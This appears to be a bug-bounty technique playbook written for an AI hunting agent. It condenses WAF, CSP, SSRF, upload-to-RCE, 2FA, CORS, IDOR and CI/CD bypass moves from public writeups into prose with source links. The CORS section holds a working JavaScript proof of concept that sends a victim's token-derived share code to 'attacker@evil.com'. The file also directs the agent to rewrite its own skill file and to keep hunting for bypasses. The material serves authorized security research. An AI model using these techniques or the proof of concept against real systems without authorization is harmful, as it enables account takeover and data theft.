# WRITEUP TECHNIQUES — distilled tricks from real, paid exploited bugs

This is the **field-intelligence** layer of the hunt. It is not a bibliography — every
entry below is a concrete, reusable **move** extracted from a real bug-bounty writeup:
the exact bypass, the escalation, and *why it works*, so you can replay it on a target.
Theory lives in `portswigger-kb/`; payloads live in PayloadsAllTheThings; the
**battle-tested tricks that beat a real defender** live here.

Use it the moment a class is in play: read the moves for that class, try the ones your
target's stack allows, and log each (F-id + STATUS). A "hardened" surface is usually one
of these tricks short (RULE 25 false-"dead"). Source link is on each move — open it for
the full walkthrough. Aggregators for hundreds more are at the bottom.

> **⚠ THIS LIST IS A FLOOR, NOT A CEILING (RULE 3.10 + RULE 10).** Never limit yourself to
> the moves bundled here. On EVERY class/objective, ALSO **live-search the web** for fresh,
> target-specific writeups (WebSearch the class + target tech for the recent years → WebFetch
> the top hits → extract the bypass), query **HackerOne Hacktivity** (RULE 3.7), and read
> **PortSwigger research**. The bundled techniques are a starting kit, not the world.
>
> **⚙ THE SKILL GROWS ITSELF (RULE 30).** When you learn or land a technique that isn't here,
> **append it** to the right class section below — distilled to a generic, reusable move with
> one source link. **Scrub every real target name / endpoint / token / PII first** (this file
> is published). Sync both copies (active skill + git repo). Every hunt should leave this file
> sharper than it found it.

> **Discipline check (learned from a real case):** a writeup titled *"hacked 40,000
> Microsoft accounts via 2FA bypass"* was, on reading, **not a 2FA bypass at all** —
> the vendor rejected it; the "40,000" was archive-indexed emails, not compromised
> accounts. **Read the mechanism, never the headline.** Clickbait titles ≠ working
> techniques. This is exactly the no-false-positive rule (RULE 25) applied to research.

---

## XSS — filter / WAF / CSP bypass & self→persistent escalation

- **Mutation XSS: harmless on the way in, executable after parsing.** A payload that a sanitiser
  accepts can mutate into script once the browser re-parses the DOM, because the sanitiser's HTML
  model and the browser's differ. Hunt it where markup is sanitised server-side then re-serialised
  client-side (`innerHTML` round-trips, rich-text editors, template hydration) — that gap is the bug,
  not the payload.
- **CSP falls to the weakest source it trusts.** Do not attack the policy, audit its allowlist: a
  whitelisted CDN that serves user-controlled files, a **JSONP** endpoint on a trusted origin (its
  callback parameter is arbitrary JS), or a **`strict-dynamic`** misconfiguration that lets an
  already-trusted script load yours. One influenceable source collapses the whole policy.
- **In an SPA the sink is client-side, so server-side filtering proves nothing.** React/Vue/Angular
  move the dangerous assignment into JS: framework-specific bindings, `dangerouslySetInnerHTML`,
  template compilation of user data. Trace source → sink in the bundle rather than fuzzing the
  server. *(And note that a 2026 WAF often scores intent semantically instead of matching
  signatures — obfuscation alone is a weaker bypass than it used to be; changing the CONTEXT beats
  encoding the payload.)*

- **Payload in the image's ECS (polymorphic image XSS).** Embed the payload inside a
  JPEG's Entropy-Coded Segment (the Huffman bitstream), positioned between `0x00`/`0x14`
  byte patterns that survive server-side re-compression. Image libraries only rebuild
  pixel data, so the bytes persist. Use `onclick`/`mouseover` handlers — `<script>` has
  low-value bytes that get mangled. Beats "we re-process all uploads" defenses.
  → https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html
- **Escalate self-XSS to persistent XSS by chaining three flaws.** (1) Hit the **origin
  IP directly** (found via DNS-history sites) to skip the Cloudflare/WAF frontend filter
  and store `<script>` in your own `firstname`. (2) The CSRF token isn't tied to a
  session → **login-CSRF** the victim into *your* account. (3) The login page renders the
  account name **pre-auth** (cached "remember me"), so your stored payload fires for the
  victim. Self-XSS is never "informational" if you can force-login a victim.
  → https://medium.com/@nnez/always-escalate-from-self-xss-to-persistent-xss-on-login-portal-54265b0adfd0

## SQL injection — WAF bypass & blind extraction

- **Nested-keyword bypass for non-recursive strippers.** If the WAF *strips* blacklisted
  words once (not recursively), hide the word inside itself: `SELSELECTECT` → strip inner
  `SELECT` → leaves `SELECT`. Same for comments: `---/*---` → `--`. Any single-pass
  filter (keywords, tags, `../`) dies to this.
  → https://robinverton.de/blog/bug-bounty-bypassing-a-crappy-waf-to-exploit-a-blind-sql-injection/
- **When sqlmap chokes on the WAF, hand-roll the blind loop.** A tiny custom script doing
  `SUBSTRING()` char-by-char (boolean/time inference) beats sqlmap when the WAF causes
  timeouts or mangles sqlmap's tamper output. Don't abandon a confirmed blind injection
  because a tool failed (RULE 27) — write 15 lines of Python.

## SSRF — filter bypass, token theft, cloud metadata

- **Why DNS rebinding beats a blocklist: the gap between check and fetch.** Filters that resolve
  and validate at submission time, then fetch later, judge one answer and request another. A record
  with a very short TTL answers public on the first lookup and internal on the second. The fix is to
  resolve once and connect to that exact IP — so wherever validation and connection are separate
  steps, the gap is still there.
- **`gopher://` writes raw bytes, so it speaks other protocols.** Because it sends the URL body
  verbatim including CRLF, and Redis, SMTP, FastCGI and memcached are line-based text protocols, an
  SSRF that accepts gopher can issue real commands to them — set a key, queue a job, reach RCE
  through FastCGI. Always test which schemes survive: `http`, `https`, `gopher`, `dict`, `file`, `ftp`.
- **IMDSv2 is not the end of cloud-metadata SSRF.** Token-required metadata defeats a bare GET, but
  not an attacker-controlled redirector: point the vulnerable server at your host, do the PUT-token
  dance yourself, and return the credential response to it. Header injection (via request
  splitting/smuggling) reaches the same place. Treat "they enforce IMDSv2" as a harder path, not a
  closed one.

- **Unvalidated `url=`/callback param that carries YOUR auth to the attacker.** Backends
  that fetch third-party data (repo integrations, webhooks, PDF/preview) often attach
  `Authorization: Bearer <victim token>` to the *outbound* request. If the destination
  isn't validated, point it at your server and **harvest the victim's token**. GET + no
  referer/CSRF check → deliver as a plain link. Always check what headers the SSRF
  *sends outbound*, not just what it reads.
  → https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/
- **DNS rebinding to beat an IP allowlist.** The app resolves your domain once for the
  allowlist check (benign IP) and again for the actual request. Run a custom DNS server,
  `TTL 0`, that answers benign N times then flips to `169.254.169.254`/`127.0.0.1`. Tool:
  `dnsFookup`. This defeats "we validate the resolved IP" SSRF filters — the classic
  TOCTOU. Spray with Intruder; watch for the odd-length response.
  → https://geleta.eu/2019/my-first-ssrf-using-dns-rebinfing/
- **SSRF through a media transcoder (FFmpeg/HLS).** Upload a crafted AVI/`.m3u8` whose
  playlist references an internal URL; FFmpeg auto-fetches it during transcode →
  server-side request to `http://127.0.0.1/…` or cloud metadata. Any "upload a video/GIF
  and we process it" feature is an SSRF (and often local-file-read) surface.
  → https://medium.com/@pflash0x0punk/ssrf-via-ffmpeg-hls-processing-a04e0288a8c5

## Race conditions — limit bypass, double-spend

- **Single-packet attack: remove the network from the race.** Bundle ~20-30 requests into one TCP
  packet so they arrive together and jitter cannot spread them out. It requires **HTTP/2** (it does
  not work over HTTP/1, which needs last-byte synchronisation instead), and modern Burp Repeater
  can send a tab group in parallel this way natively — no scripting needed for the first attempt.
  Reach for a scripted engine only when the attack needs retries, staggered timing, or thousands of
  requests. **Test the limit-overrun shape first:** any single-use or rate-limited action — coupon,
  invite, withdrawal, vote, 2FA attempt — fired N times at once, then check whether the counter
  survived.

- **Fire N parallel requests into the validate→deduct→confirm window.** Server logic
  runs sequentially: it validates balance/limit, *then* deducts. Send many identical
  requests simultaneously and several pass validation before the first deduction lands →
  buy premium multiple times, drive balance negative, redeem a coupon repeatedly, bypass
  invite/vote/withdrawal limits. Any single-use / limited action is a candidate; send 20-50
  concurrent (single-packet / last-byte sync). Foundational reference:
  → https://www.josipfranjkovic.com/blog/race-conditions-on-web

## Authentication — SAML / OAuth / 2FA

- **A rate limit that still answers the question is not a rate limit.** After N wrong OTPs the app
  starts returning 429/401 — but check what the CORRECT code returns while you are throttled. If a
  valid guess still yields 200 (or any different body, length or timing), the block is cosmetic and
  the code space is still walkable. Two more shapes to test: **re-requesting the code resets the
  counter** (infinite attempts, just slower), and the limit is applied per-session or per-IP rather
  than per-account — rotate either and continue.
- **Attack the 2FA lifecycle, not just the prompt.** Backup/recovery codes are often generated and
  readable the moment 2FA is enabled, sometimes from an endpoint that predates the second factor.
  Also test: disabling 2FA via CSRF or clickjacking, "remember this device" cookies that are
  guessable or not bound to the account, and the response-body flip (`"verified": false` → `true`)
  where the client decides the outcome the server should have.

- **SAML confused-deputy (audience not validated).** Present an assertion minted for
  *another* Service Provider — even an **expired** one from a different IdP (e.g. a GitHub
  assertion) — to the target's `/sso/saml`. If it fails to validate `AudienceRestriction`,
  expiry, and subject, it authenticates you **as that subject**. Test whether an assertion
  meant for B is accepted by A.
  → https://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html
- **2FA rate-limit bypass via `X-Forwarded-For`.** If the OTP throttle keys on a
  user-controllable header, rotate `X-Forwarded-For: <random IP>` each request → the limit
  resets → brute the 4-6 digit code (10k-1M space). Rule of thumb: any rate-limit keyed on
  request-supplied data (XFF, `X-Real-IP`, `Client-IP`) is bypassable. Also try code
  padding and concurrent submission.
  → https://medium.com/@YumiSec/how-to-bypass-a-2fa-with-a-http-header-ce82f7927893

## File upload / LFI → RCE

- **When the filter is a parser, attack the parser.** Servers that "safely" validate uploads by
  opening them hand your bytes to ImageMagick, a PDF or office parser, an archive extractor or a
  metadata library — each with its own memory-safety and command-injection history. A malformed but
  plausible file can reach RCE through the validator itself. Same idea for archives: path traversal
  in a member name (**Zip Slip**) writes outside the extraction directory, and a nested archive can
  hide the payload from a shallow scan.

- **Cross-service LFI + upload chain.** Upload endpoint checks extension via a tamperable
  `ext` param → upload a shell in the interpreter the target *actually runs* (they found
  the image server runs **Perl**, not PHP — LFI-recon the running services first). Then
  the **LFI on that server includes/executes** the uploaded file → reverse shell. Chain a
  weak upload on service A with an include on service B.
  → https://medium.com/@armaanpathan/chain-the-bugs-to-pwn-an-organisation-lfi-unrestricted-file-upload-remote-code-execution-93dfa78ecce
- **PHP-GD-resistant image webshell.** GD strips EXIF, so plant the payload where GD
  *doesn't* touch: a **GIF's Netscape Looping Application Extension** null-byte block
  survives `imagecreatefromgif`. (JPEG injection survives only at default quality `-1`,
  ~13 bytes; quality ≥90 strips it.) Then rename the multipart **filename field** to
  `.php`. Needs `short_open_tag` on or full `<?php ?>`. Tools: `php-jpeg-injector` (dlegs),
  GIF injectors. Beats "we re-encode every upload with GD" defenses.
  → https://asdqw3.medium.com/remote-image-upload-leads-to-rce-inject-malicious-code-to-php-gd-image-90e1e8b2aada

## CORS → account takeover

- **Reflected ACAO + `ACAC: true` = read any authenticated endpoint cross-origin.** If the
  server reflects `Origin` into `Access-Control-Allow-Origin` and sets
  `Access-Control-Allow-Credentials: true`, host JS that does `withCredentials` XHR to a
  token endpoint, reads the response, then POSTs it to a recovery/share endpoint pointed at
  your email. Chain with **sessions that never invalidate** (after logout/password change)
  → durable full ATO. The exact PoC shape:
  ```javascript
  var x=new XMLHttpRequest(); x.open("GET","https://sub.host/api/mail-token",true);
  x.withCredentials=true; x.onload=function(){ var t=JSON.parse(this.responseText).mail_token;
    var y=new XMLHttpRequest(); y.open("POST","https://sub.host/api/email/share-code",true);
    y.withCredentials=true; y.setRequestHeader("MailToken",t);
    y.setRequestHeader("Content-Type","application/json");
    y.send('{"recipient_emails":["attacker@evil.com"]}'); }; x.send();
  ```
  → https://medium.com/@mashoud1122/cors-misconfiguration-account-takeover-out-of-scope-to-grab-items-in-scope-66d9d18c7a46

## CSRF — JSON endpoints & escalation

- **JSON CSRF via method-override + `text/plain`.** JSON APIs feel CSRF-safe, but if they
  honor a method-override (`_method`, `X-HTTP-Method-Override`, or a query param) and don't
  enforce `Content-Type`, send a normal auto-submitting HTML form with
  `enctype="text/plain"` whose single field is crafted JSON
  (`{"x":"y"...=`) — no preflight, no token. Turns a "JSON-only" state-changing endpoint
  into a one-click CSRF. Also escalate CSRF → ATO when it changes email/password/2FA.
  → devanshbatham & kh4sh3i CSRF sections (aggregators below)

## Open redirect / domain-validation bypass → 1-click ATO

- **Unescaped `.` in a domain-allowlist regex = wildcard = bypass.** Redirect/origin/domain
  allowlists are often a regex like `/(^|\.)(good\.com|.*-hash-uc.a.run.app)$/`. The dots in
  `.a.run.app` are **not escaped**, so `.` matches ANY character — the "allowlist" now accepts
  hosts it never intended, letting an attacker satisfy it with a controlled/look-alike host.
  Chained through an OAuth/login `redirect_uri` or post-login redirect → the auth code/token
  lands on the attacker's host → **1-click account takeover** (victim need only be logged in).
  When you see a redirect/origin/domain check: test whether its regex **escapes dots** and is
  **fully anchored** (`^…$`); an unescaped `.` or a missing anchor is the bug. Confirmed live
  via HackerOne Hacktivity — fix was literally `a.run.app` → `a\.run\.app`.
  → https://hackerone.com/reports/3723458 (disclosed, Critical, CVSS 9.6)
  *(Added by RULE 30 self-evolution from a live HackerOne MCP `get_report` pull — the exact
  loop the skill runs mid-hunt: hacktivity → get_report → distill → write back.)*

---

## API / GraphQL — object & function-level authorization

- **Decode → increment → re-encode the GraphQL global ID.** Relay-style `node(id:)` takes an opaque
  global ID that is usually just base64 of `Type:pk` — `VXNlcjoxMjM=` decodes to `User:123`. Decode
  it, change the primary key, re-encode, and query `node(id:)` again. The opacity is the whole
  defense: teams treat the encoded blob as unguessable and skip the object-level check behind it.
  This same decode/increment pattern is evidenced repeatedly across major programs. Try sibling
  types too — the same trick reaches objects the UI never exposes.
  → https://arxiv.org/html/2605.25865
- **Sequential integers are still the most common identifier — check before assuming UUIDs saved them.**
  In an empirical taxonomy of 100+ BOLA disclosures from mature programs, sequential integers were
  the most evidenced identifier type (~37%). A UUID somewhere in the app does not mean UUIDs
  everywhere: mixed schemes are normal, and the numeric one is usually the older, less-guarded path.
  → https://arxiv.org/html/2605.25865
- **BOLA and BFLA fail in different places — test both.** BOLA is "can I reach *another object*
  through an endpoint I am allowed to call"; BFLA is "can I call *an endpoint* my role should not
  have at all". A clean BOLA result says nothing about BFLA: swap the object id AND, separately,
  call the admin-only mutation/route as a low-privilege user. Introspection or a leaked schema
  hands you the BFLA target list directly.
- **Mass assignment (BOPLA) — send the fields the client should not own.** Add `role`, `isAdmin`,
  `verified`, `balance`, `ownerId`, `tenantId` to a create/update body or GraphQL mutation input.
  Frameworks that bind request bodies straight to models accept whatever they recognise; the UI
  never sends these fields, so validation for them is often absent. Compare the object before and
  after — a silent accept is still a privilege escalation.
- **Wrap the identifier the authorization layer did not expect.** `{"id": 111}` returns 401 while
  `{"id": [111]}` returns 200. The check reads a scalar and a wrapper defeats it, while the ORM
  behind it happily unwraps the array. Try the same shape-shift everywhere an id is validated:
  array, nested object (`{"id": {"id": 111}}`), duplicated parameter, string-vs-int, and the id
  moved between query, body and header. **Authorization written for one shape rarely survives another.**
- **UUIDs are not an access-control fix, and they leak.** Unguessable ids stop enumeration, not the
  missing ownership check — a UUID you obtain elsewhere still works. Harvest them from error
  messages, page source, logs, exports, notification emails, and any endpoint that lists objects for
  a *different* purpose. **Blind IDOR still counts:** if the response body shows nothing, look for
  the side effect — a 200 vs 403 difference, a timing gap, a state change visible on the victim
  account, or an email the action triggered.

- **Shadow surface: undocumented endpoints and older API versions.** `/api/v1` frequently survives
  after `/api/v2` ships, with the old authorization code and no rate limiting. Mine JS bundles,
  mobile binaries, schema introspection and archived docs for routes the current client never calls
  — an endpoint nobody remembers is an endpoint nobody re-secured.

## Cache poisoning — unkeyed inputs

- **The whole class is one question: what does the origin READ that the cache does not KEY on?**
  Classic unkeyed inputs are headers the app honours and the cache ignores (`X-Forwarded-Host`,
  `X-Forwarded-Scheme`, `Accept-Language`, custom ones). Modern additions: **HTTP/2 pseudo-headers**
  (`:authority`, `:path`, `:scheme`) are frequently left out of the cache key while the backend
  routes on them. Find the gap by sending a distinctive value and seeing whether it comes back to a
  *different* requester.
- **Impact is decided by who else gets the poisoned copy.** Self-poisoning is nothing; prove another
  requester receives it. That means understanding the key: which parameters, headers and path
  normalisations the cache includes — path confusion (`/x.js` vs `/x.js/..%2f`) often lands a
  response under a key other users request.

## Infrastructure — dangling references

- **A takeover mitigation usually protects NEW resources, not existing ones.** Cloud providers keep
  closing name-reuse vectors (for example S3 moved to account-scoped bucket namespaces in 2026), but
  such changes routinely exempt resources created before the change. So "the provider fixed that"
  is a reason to check the resource's age, not to skip the class. The test never changes: does a
  live DNS record point at something nobody owns any more?

## CI/CD & supply chain — the build system is in scope

- **Four misfeatures explain nearly every major CI/CD compromise.** Learn the shapes rather than the
  incidents: (1) **privileged triggers on untrusted input** — a workflow that runs with repository
  secrets in response to a fork's pull request (`pull_request_target` and friends) checks out
  attacker-controlled code with the token in scope; (2) **mutable version references** — actions
  pinned to a tag rather than a commit hash, so a maintainer (or someone who took their account)
  can repoint the tag and every consumer pulls new code; (3) **a shared object pool across forks**
  — objects pushed to a fork are reachable from the parent, so "unmerged" code is still fetchable;
  (4) **poisonable caches** — build caches written by a low-privilege context and read by a
  high-privilege one.
- **What to test when a program's repos or pipeline are in scope.** Read `.github/workflows/*` as
  code you can influence: which triggers run on fork input, what secrets are in scope for those
  jobs, is any action referenced by tag instead of SHA, does any step interpolate untrusted text
  (PR title, branch name, issue body) straight into a `run:` block, and does a self-hosted runner
  execute anything from a fork. **A workflow is a shell script that runs with the org's credentials
  — treat every field an outsider can set as injection into it.**
- **Impact framing beats the trigger.** The finding is not "this workflow is misconfigured"; it is
  "an outside contributor obtains this token, which can do X to this repository/registry". Prove
  what the leaked credential reaches — that difference is what makes it critical rather than
  informational.
- **Dependency confusion still resolves.** Internal package names that are unregistered on the
  public registry get fetched from there when resolution prefers the higher version. Harvest names
  from lockfiles, build logs, container images and error messages; registering the name is usually
  out of bounds, so report the exposure rather than proving it by claiming the package.

## CROSS-CUTTING PATTERNS (what these cases teach in aggregate)

- **Escalate, always.** self-XSS→persistent (login-CSRF), IDOR→ATO, SSRF→token theft/RCE,
  CORS→ATO, LFI+upload→RCE, CSRF→email change→ATO. A lone low is a bite; the chain is the
  feast. Never report the primitive without pushing for the crown (RULE 26 impact).
- **Attack the transform, not the input.** Polymorphic images, GD-resistant bytes,
  FFmpeg playlists, method-override — the win is often in what the *server does to your
  input* (re-encode, transcode, override, reflect), not the input itself.
- **Rate-limits/allowlists keyed on client-controlled data are theatre.** `X-Forwarded-For`
  throttles, resolve-then-fetch SSRF checks (rebinding), single-pass strippers — all TOCTOU
  or trust-the-client failures.
- **A tool failing ≠ the bug is absent.** sqlmap timing out on a WAF, an upload "rejected"
  — hand-roll the loop, hit the origin IP, change the interpreter. Diagnose, don't abandon
  (RULE 27).
- **Read the mechanism, not the headline** (the "40k Microsoft" non-bug above).

---

## MASTER AGGREGATORS — thousands of writeups, kept current

Go here for breadth, newer bugs, or a specific program/tech stack.

- **Pentester Land** (largest curated directory; searchable by type/program/author/**bounty**/date)
  — https://pentester.land/writeups/ · https://pentester.land/list-of-bug-bounty-writeups.html
- **HackerOne Hacktivity** — live disclosed reports; query mid-hunt via the HackerOne MCP
  (`mcp__hackerone__hacktivity`, `get_report`) — see RULE 3.7.
- **PortSwigger Research** — https://portswigger.net/research — source of most novel web
  classes (request smuggling, cache poisoning/deception, desync). Distilled in `portswigger-kb/`.
- **writeups.io** — https://writeups.io/ · **InfoSec Writeups** — https://infosecwriteups.com/
- Curated GitHub, indexed by bug class (hundreds of links each):
  - devanshbatham/**Awesome-Bugbounty-Writeups** — https://github.com/devanshbatham/Awesome-Bugbounty-Writeups
  - kh4sh3i/**bug-bounty-writeups** (28 classes) — https://github.com/kh4sh3i/bug-bounty-writeups
  - ngalongc/**bug-bounty-reference** — https://github.com/ngalongc/bug-bounty-reference
  - xdavidhu/**awesome-google-vrp-writeups** — https://github.com/xdavidhu/awesome-google-vrp-writeups

### Modern canon — read the primary research (creates whole classes)
- **James Kettle / PortSwigger** — HTTP Desync/Request Smuggling (2019), Browser-Powered
  Desync (2022), *HTTP/1.1 Must Die: the desync endgame* (2025), Web Cache Poisoning series.
- **Orange Tsai** — SSRF/proxy/parser confusion — https://blog.orange.tw/
- **Gareth Heyes** — DOM XSS, prototype pollution, mutation XSS (PortSwigger research).
- **intothesymmetry (Antonio Sanso)** — OAuth/SAML/OIDC — https://blog.intothesymmetry.com/
- **Sam Curry / Frans Rosén** — large multi-vuln ATO chains, postMessage/OAuth/cloud takeover.

---

## THE RULE

A surface is never "secure" because your first payload bounced. Someone already beat a
defender exactly like it and wrote down the trick. Find it, steal it, adapt it to the
target's real stack — *before* you ever conclude an honest zero. Hunt from real cases,
not from theory.
